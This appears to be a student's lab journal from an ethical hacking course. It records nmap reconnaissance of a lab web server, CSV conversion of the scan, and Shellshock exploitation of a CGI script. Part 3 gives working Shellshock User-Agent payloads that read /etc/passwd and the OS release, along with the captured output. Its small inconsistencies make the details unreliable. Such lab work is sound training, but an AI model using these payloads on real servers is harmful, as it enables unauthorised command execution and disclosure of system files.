
## Part 1 - Active Recon (20 minutes)

The target is cupcake.shire.org at 10.0.5.23

What can you find out about the target?

```
└─$ sudo nmap -sS -sV 10.0.5.28

PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd 2.2.15 ((CentOS))
443/tcp open  ssl/http Apache httpd 2.2.15 ((CentOS))                                                            
```

- Apache webserver on port 80 & 443
- webpage on both HTTP and HTTPS, looks like same webpage though
- access to cgi-bin/status
<img width="769" height="179" alt="{9EBADD68-4D7F-434A-8227-C44995052946}" src="https://github.com/user-attachments/assets/8006144b-4a91-415b-89ae-3b13e3baf830" />

## Part 2 - Dealing with Targets and Scans (10 minutes)

- another way to get version info(this is more trustworthy than nmap): using 404 error message to check if there's publicly available information
<img width="496" height="220" alt="{B5FBB211-5A07-43C6-9EE5-27309C7E2D2E}" src="https://github.com/user-attachments/assets/081fa3a3-712e-4553-b1e1-d3c901fede64" />

- **Apache/2.2.15 (CentOS) Server at 10.0.5.28 Port 80**
- nmap OS version detection gave nothing useful


- Install nmaptocsv in virtual environment
```
sudo apt update
sudo python3 -m venv ~/.venv
source ~/.venv/bin/activate
sudo ~/.venv/bin/pip install nmaptocsv

┌──(.venv)─(champuser㉿kali)-[~/ChamplainTechJournals/eth-hack-sec335/week04]
└─$ sudo nmap -sS -sV 10.0.5.28 -oG cupcake.txt
PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd 2.2.15 ((CentOS))
443/tcp open  ssl/http Apache httpd 2.2.15 ((CentOS))
                                                                                                                                                            
┌──(.venv)─(champuser㉿kali)-[~/ChamplainTechJournals/eth-hack-sec335/week04]
└─$ nmaptocsv -i cupcake.txt -d ','
"IP","FQDN","PORT","PROTOCOL","SERVICE","VERSION"
"10.0.5.28","","80","tcp","http","Apache httpd 2.2.15 ((CentOS))"
"10.0.5.28","","443","tcp","ssl|http","Apache httpd 2.2.15 ((CentOS))"
```
<img width="787" height="103" alt="{0D3AF008-3A25-441A-8358-B4243C4695A2}" src="https://github.com/user-attachments/assets/ba30d2cc-ce27-44d9-b60f-a6284752d1cb" />


## Part 3 - Vulnerability Detection (10 Minutes)


```
sudo nmap -sV -p 80 --script http-shellshock --script-args url=/cgi-gib/status,cmd="echo ; echo ; /user/bin/whoami" 10.0.5.28
```

```
└─$ curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.0.5.28/cgi-bin/status
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
gopher:x:13:30:gopher:/var/gopher:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
rpc:x:32:32:Rpcbind Daemon:/var/cache/rpcbind:/sbin/nologin
vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin
abrt:x:173:173::/etc/abrt:/sbin/nologin
apache:x:48:48:Apache:/var/www:/sbin/nologin
saslauth:x:499:76:"Saslauthd user":/var/empty/saslauth:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin
haldaemon:x:68:68:HAL daemon:/:/sbin/nologin
ntp:x:38:38::/etc/ntp:/sbin/nologin
tomcat:x:91:91:Apache Tomcat:/usr/share/tomcat6:/sbin/nologin
webalizer:x:67:67:Webalizer:/var/www/usage:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
tcpdump:x:72:72::/:/sbin/nologin
oprofile:x:16:16:Special user account to be used by OProfile:/home/oprofile:/sbin/nologin
samwise:x:500:500::/home/samwise:/bin/bash
deployer:x:501:501::/home/deployer:/bin/bash
```


```
curl -H 'User-Agent: () { :; ); echo ; echo ; /bin/cat /etc/redhat-release' bash -s :'' http://10.0.5.28/cgi-bin/status

CentOS release 6.5 (Final)
```
